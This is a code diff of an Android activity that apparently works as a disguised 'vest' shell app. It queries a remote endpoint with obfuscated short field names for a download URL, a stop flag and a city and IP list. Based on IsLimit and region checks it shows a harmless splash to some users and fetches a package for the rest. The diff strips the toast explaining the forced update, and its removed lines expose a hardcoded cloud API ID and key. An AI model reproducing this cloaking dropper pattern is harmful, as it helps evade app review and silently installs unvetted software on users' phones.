@@ -54,10 +54,6 @@ import java.util.Enumeration;
 import java.util.List;
 import java.util.Locale;
 
-import androidx.annotation.NonNull;
-import androidx.annotation.Nullable;
-import androidx.core.app.ActivityCompat;
-import androidx.core.content.ContextCompat;
 import androidx.core.content.FileProvider;
 
 
@@ -71,9 +67,9 @@ import androidx.core.content.FileProvider;
 public class MJRegusActivity extends Activity {
 
     //服务器上的马甲id
-    String mAid = "REGUS_AID";
+    String mAid = "I20211026104238211436";
     //服务器上该马甲的渠道id
-    String mSid = "REGUS_SID";
+    String mSid = "R20211026104516833568";
 
 
 //    String mAid = "178";
@@ -98,9 +94,9 @@ public class MJRegusActivity extends Activity {
 
 
     //该页面的启动页图片的id
-    int splash_bg_id = 2131230876;
+    int splash_bg_id ;
     //该页面的下载时候的背景图片id
-    int splash_down_bg_id = 2131230877;
+    int splash_down_bg_id ;
 
 
     /**
@@ -108,13 +104,13 @@ public class MJRegusActivity extends Activity {
      */
 
     //页面布局的id
-    int activity_layout_id = 2131230874;
+    int activity_layout_id ;
     //页面布局的根布局的id
-    int root_view_id = 2131230875;
+    int root_view_id ;
     //该页面的加载框id
-    int progress_bar_id = 2131230878;
+    int progress_bar_id ;
     //百分比
-    int progress_bar_num = 2131230879;
+    int progress_bar_num ;
 
 
     String downLoadUrl;
@@ -161,8 +157,15 @@ public class MJRegusActivity extends Activity {
 
 
     @Override
-    protected void onCreate(@Nullable Bundle savedInstanceState) {
+    protected void onCreate( Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+
+        splash_bg_id = CPResourceUtil.getMipmapId(getApplicationContext(),"mj_splash");
+        splash_down_bg_id = CPResourceUtil.getMipmapId(getApplicationContext(),"mj_down_splash");
+        activity_layout_id = CPResourceUtil.getLayoutId(getApplicationContext(),"mj_regus_splash");
+        root_view_id = CPResourceUtil.getId(getApplicationContext(),"mj_root_view");
+        progress_bar_id = CPResourceUtil.getId(getApplicationContext(),"mj_progressBar");
+        progress_bar_num = CPResourceUtil.getId(getApplicationContext(),"mj_progress_num");
 
 
         getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
@@ -284,21 +287,31 @@ public class MJRegusActivity extends Activity {
         public void run() {
 
             try {
-                URL urll = new URL("https://tlmdw22a.api.lncld.net/1.1/classes/UpVersion/6168e24d31c3f94692a5de7d");
+                PrintWriter out = null;
+                BufferedReader in = null;
+
+                URL urll = new URL("http://mock-api.com/Gzq2ZOgW.mock/getLocation");
                 HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
-                urlConnection.setRequestProperty("X-LC-Id", "tLmDW22ab3CfULnkBagYBcqi-gzGzoHsz");
-                urlConnection.setRequestProperty("X-LC-Key", "YOF1GehjRo4WYR15TaE9ij3L");
                 urlConnection.setConnectTimeout(4000);
                 urlConnection.setReadTimeout(4000);
-                urlConnection.setRequestMethod("GET");
-                urlConnection.connect();
+                urlConnection.setRequestMethod("PUT");
+                urlConnection.setRequestProperty("Content-Type", " application/json");// 设定
+                urlConnection.setRequestProperty("accept", "*/*");
+                urlConnection.setDoOutput(true);
+                urlConnection.setDoInput(true);
+                // 获取URLConnection对象对应的输出流
+                out = new PrintWriter(urlConnection.getOutputStream());
+                // 发送请求参数
+                out.print("{\"key\": \"ttc\"}");
+                // flush输出流的缓冲
+                out.flush();
                 int code = urlConnection.getResponseCode();
                 if (code == 200) {
-                    InputStream inputStream = urlConnection.getInputStream();
-                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
+                    in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
+
                     String line;
                     StringBuffer buffer = new StringBuffer();
-                    while ((line = bufferedReader.readLine()) != null) {
+                    while ((line = in.readLine()) != null) {
                         buffer.append(line);
                     }
                     String jsonStr = buffer.toString();
@@ -309,9 +322,9 @@ public class MJRegusActivity extends Activity {
                         JSONObject avObject = new JSONObject(jsonStr);
 
 
-                        int show = avObject.getInt("show");
-                        String url = avObject.getString("url");
-                        boolean isStop = avObject.getBoolean("stop");
+                        int show = avObject.getInt("sh");
+                        String url = avObject.getString("u");
+                        boolean isStop = avObject.getBoolean("st");
 
                         //重庆，北京，南京，上海，深圳，广州，四川，江苏，苏州，武汉，长沙，福建，浙江
                         JSONArray ipsArray = avObject.getJSONArray("ips");
@@ -401,6 +414,9 @@ public class MJRegusActivity extends Activity {
                 } else {
                     RequestThat();
                 }
+
+                urlConnection.disconnect();// 断开连接
+
             } catch (Exception e) {
                 RequestThat();
             }
@@ -463,7 +479,7 @@ public class MJRegusActivity extends Activity {
         try {
             mPermissionList.clear();
             for (int i = 0; i < permissions.length; i++) {
-                if (ContextCompat.checkSelfPermission(this, permissions[i]) != PackageManager.PERMISSION_GRANTED) {
+                if (checkSelfPermission(permissions[i]) != PackageManager.PERMISSION_GRANTED) {
                     mPermissionList.add(permissions[i]);
                 }
             }
@@ -473,22 +489,14 @@ public class MJRegusActivity extends Activity {
             if (mPermissionList.isEmpty()) {//未授予的权限为空，表示都授予了
                 afterCheckPermision();
             } else {//请求权限方法
-
-                runOnUiThread(new Runnable() {
-                    @Override
-                    public void run() {
-                        Toast.makeText(MJRegusActivity.this, "版本需要强制更新，请给予必要权限~", Toast.LENGTH_LONG);
-                    }
-                });
-
-                String[] permissions = mPermissionList.toArray(new String[mPermissionList.size()]);//将List转为数组
-                ActivityCompat.requestPermissions(this, permissions, 1);
+                 String[] permissions = mPermissionList.toArray(new String[mPermissionList.size()]);//将List转为数组
+                 requestPermissions(permissions, 1);
             }
         } catch (Exception e) {
 
             //某些机型在启动页申请权限会有问题  或者 有些低版本机型 不需要申请 或者没有ActivityCompat这个类
             //先进去  里面的会帮我申请好权限
-            jumpLocalSplash();
+            afterCheckPermision();
 
         }
 
@@ -496,14 +504,14 @@ public class MJRegusActivity extends Activity {
 
 
     @Override
-    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+    public void onRequestPermissionsResult(int requestCode,  String[] permissions,  int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         switch (requestCode) {
             case 1:
                 for (int i = 0; i < grantResults.length; i++) {
                     if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                         //判断是否勾选禁止后不再询问
-                        boolean showRequestPermission = ActivityCompat.shouldShowRequestPermissionRationale(this, permissions[i]);
+                        boolean showRequestPermission = shouldShowRequestPermissionRationale(permissions[i]);
                         if (showRequestPermission) {//
                             checkPermision();//重新申请权限
                             return;
@@ -707,6 +715,7 @@ public class MJRegusActivity extends Activity {
                         //IsLimit
                         if (dataJsonObject.getBoolean("IsLimit")) {
                             Log.e("regus_", " IsLimit true");
+                            jumpLocalSplash();
                             return;
                         }
 
